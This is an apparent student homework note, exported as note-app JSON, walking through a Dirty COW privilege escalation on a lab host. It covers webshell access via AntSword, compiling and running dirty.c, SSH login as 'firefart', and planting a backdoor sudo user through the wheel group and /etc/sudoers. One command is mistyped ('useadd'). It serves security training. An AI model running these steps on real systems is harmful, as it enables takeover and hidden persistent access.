{"ID":"20241029112447-t6glbea","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241029112447-t6glbea","title":"张钰10.29作业","updated":"20241029193612"},"Children":[{"ID":"20241029112447-letj477","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241029112447-letj477","updated":"20241029112457"},"Children":[{"Type":"NodeText","Data":"脏牛提权"}]},{"ID":"20241029112459-o8c39se","Type":"NodeParagraph","Properties":{"id":"20241029112459-o8c39se","updated":"20241029112534"},"Children":[{"Type":"NodeText","Data":"蚁剑连接shell，打开虚拟终端查看当前用户和内核版本信息"}]},{"ID":"20241029112523-s9wvnjq","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112523-s9wvnjq","updated":"20241029112542"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"id\nuname -a\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029115012-1z1xhq3","Type":"NodeParagraph","Properties":{"id":"20241029115012-1z1xhq3","updated":"20241029115012"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115012-2rq3zfk.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029112548-ws4vx3v","Type":"NodeParagraph","Properties":{"id":"20241029112548-ws4vx3v","updated":"20241029112610"},"Children":[{"Type":"NodeText","Data":"将脏牛工具上传到/tmp目录下"}]},{"ID":"20241029112615-31kge55","Type":"NodeParagraph","Properties":{"id":"20241029112615-31kge55","updated":"20241029112645"},"Children":[{"Type":"NodeText","Data":"进入/tmp目录，编译脏牛工具（上传的是源码脚本，编译后才能执行）"}]},{"ID":"20241029112646-6sgriye","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112646-6sgriye","updated":"20241029112706"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"gcc -pthread dirty.c -o dirty -lcrypt\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029115553-0jz8wri","Type":"NodeParagraph","Properties":{"id":"20241029115553-0jz8wri","updated":"20241029115553"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115553-uarj6l2.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029112712-ll99uz6","Type":"NodeParagraph","Properties":{"id":"20241029112712-ll99uz6","updated":"20241029112732"},"Children":[{"Type":"NodeText","Data":"执行脏牛工具，执行文件，后面是密码，随便定义"}]},{"ID":"20241029112732-9uwjuo7","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112732-9uwjuo7","updated":"20241029112745"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"./dirty 123456\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029115616-8ss9oca","Type":"NodeParagraph","Properties":{"id":"20241029115616-8ss9oca","updated":"20241029115616"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115615-veosq7n.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029112712-e1q1ywe","Type":"NodeParagraph","Properties":{"id":"20241029112712-e1q1ywe","updated":"20241029112805"},"Children":[{"Type":"NodeText","Data":"验证查看"}]},{"ID":"20241029112810-lf24n5d","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112810-lf24n5d","updated":"20241029112822"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"cat /etc/passwd\nls\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029112830-6qdw5gk","Type":"NodeParagraph","Properties":{"id":"20241029112830-6qdw5gk"}},{"ID":"20241029112831-eqxdni9","Type":"NodeParagraph","Properties":{"id":"20241029112831-eqxdni9","updated":"20241029112918"},"Children":[{"Type":"NodeText","Data":"用firefart用户进行远程连接，并查看权限"}]},{"ID":"20241029112849-pyc487y","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112849-pyc487y","updated":"20241029112921"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh firefart@192.168.100.247\nid\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029112909-6rx5dh6","Type":"NodeParagraph","Properties":{"id":"20241029112909-6rx5dh6","updated":"20241029112937"},"Children":[{"Type":"NodeText","Data":"利用权限提升后创建后门用户"}]},{"ID":"20241029112939-s6oonew","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029112939-s6oonew","updated":"20241029113005"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"mv /tmp/passwd.bak /etc/passwd\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029113021-d7i7stu","Type":"NodeParagraph","Properties":{"id":"20241029113021-d7i7stu","updated":"20241029113100"},"Children":[{"Type":"NodeText","Data":"wheel组为普通管理员组，默认不开启，利用wheel组来创建后门用户"}]},{"ID":"20241029113102-my6omle","Type":"NodeParagraph","Properties":{"id":"20241029113102-my6omle","updated":"20241029113128"},"Children":[{"Type":"NodeText","Data":"修改/etc/sudoers配置文件，默认只读，需要修改权限"}]},{"ID":"20241029113128-rrdmvbd","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029113128-rrdmvbd","updated":"20241029113144"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"chmod u+w /etc/sudoers\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029113151-lurx2k0","Type":"NodeParagraph","Properties":{"id":"20241029113151-lurx2k0","updated":"20241029113215"},"Children":[{"Type":"NodeText","Data":"去除配置文件的105行注释，使wheel组生效"}]},{"ID":"20241029113216-8ml3zaq","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029113216-8ml3zaq","updated":"20241029113232"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"vim /etc/sudoers\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029113235-8tdr8b5","Type":"NodeParagraph","Properties":{"id":"20241029113235-8tdr8b5","updated":"20241029113310"},"Children":[{"Type":"NodeText","Data":"创建普通用户gua，并添加wheel组，使其拥有管理员权限"}]},{"ID":"20241029113314-ua5suht","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029113314-ua5suht","updated":"20241029113337"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"useadd gua\npasswd gua\ngpasswd -a gua wheel\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029113344-5djr3rd","Type":"NodeParagraph","Properties":{"id":"20241029113344-5djr3rd","updated":"20241029113355"},"Children":[{"Type":"NodeText","Data":"低级用户切换到root权限"}]},{"ID":"20241029113356-6f9uaxp","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029113356-6f9uaxp","updated":"20241029193612"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"sudo su root\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193532-wik6v7u","Type":"NodeParagraph","Properties":{"id":"20241029193532-wik6v7u"}}]}